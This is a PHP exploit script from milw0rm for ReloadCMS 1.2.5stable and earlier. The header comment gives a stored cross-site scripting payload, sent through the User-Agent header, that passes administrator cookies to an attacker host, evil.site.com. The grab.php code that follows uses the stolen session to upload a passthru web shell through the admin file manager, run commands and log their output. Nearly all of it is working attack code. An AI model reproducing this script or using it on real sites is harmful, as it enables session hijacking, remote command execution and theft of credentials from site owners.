<?php
/*
ReloadCMS <= 1.2.5stable Cross site scripting / remote command execution

software site: http://reloadcms.com/
description: "ReloadCMS is a free CMS written on PHP and based on flat files."

vulnerability:
ReloadCMS do not properly sanitize User-Agent request header before to store it
in stats.dat file.
Example of an attack, through netcat:

rgod>nc target.host.com 80
GET /path_to_reloadcms/ HTTP/1.0
User-Agent: "><script>window.open("http://evil.site.com/grab.php?c="+document.cookie+"&ref="+document.URL);window.close();</script>
Host: target.host.com
Connection: Close

So, when admin see site statistics through the administration panel, javascript
will run

Once grab.php script captures admin cookie, the script itself can upload a shell
trough filemanager, launch commands and write output to a logfile also, inside
cookies, there is admin MD5 password hash

rgod
mail: rgod@autistici.org
site: http://retrogod.altervista.org
							                      */

#--------------------------------grab.php---------------------------------------
#cookie grabber / backdoor install

$cmd="uname -a"; //a shell command, leave empty to lauch commands later trough suntzu.php
$proxy=""; //you can use a proxy (ip:port), otherwise leave empty
$logfile="log.txt";
$filename="suntzu.php"; //shell filename

error_reporting(0);
ignore_user_abort(1);
ini_set("max_execution_time",0);

//log referer and cookies
$fp=fopen($logfile,"a");
fputs($fp,$_GET['ref']."|".$_GET['c']."\r\n");

$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      die;
    }
    $parts=explode(':',$proxy);
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$temp=explode("/",$_GET['ref']);
$host=$temp[2];
$path="";
if (count($temp)>4)
{
for ($i=3; $i<=count($temp)-2; $i++)
{$path.="/".$temp[$i];}
}
$path.="/";
$port=80;

#step 1 -> Get full application path, it is inside html, you need this to upload a shell
$packet ="GET ".$path."admin.php?show=module&id=general.filemanager HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: ".$_GET[c].";\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);

#step 2 -> Upload the evil code
$temp=explode('name="path" value="',$html);
$temp2=explode("\"",$temp[1]);
$fullpath=$temp2[0];
$shell='<?php error_reporting(0);ini_set("max_execution_time",0);if (get_magic_quotes_gpc()){$_GET[cmd]=stripslashes($_GET[cmd]);}passthru($_GET[cmd]);?>';
$data="-----------------------------7d529a1d23092a\r\n";
$data.="Content-Disposition: form-data; name=\"upload\"; filename=\"$filename\"\r\n";
$data.="Content-Type:\r\n\r\n";
$data.="$shell\r\n";
$data.="-----------------------------7d529a1d23092a\r\n";
$data.="Content-Disposition: form-data; name=\"path\"\r\n\r\n";
$data.="$fullpath\r\n";
$data.="-----------------------------7d529a1d23092a\r\n";
$data.="Content-Disposition: form-data; name=\"test\"\r\n\r\n";
$data.="Upload\r\n";
$data.="-----------------------------7d529a1d23092a--\r\n";
$packet ="POST ".$path."admin.php?show=module&id=general.filemanager HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n";
$packet.="User-Agent: Googlebot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Cookie: ".$_GET[c].";\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);

$packet ="GET ".$path."suntzu.php?cmd=".urlencode($cmd)." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);

//log output
fputs($fp,"suntzu>".$cmd."\r\n");
fputs($fp,"\r\n".$html."\r\n");
fclose($fp);
header ("Location: ".$_GET['ref']);
?>

# milw0rm.com [2006-04-02]
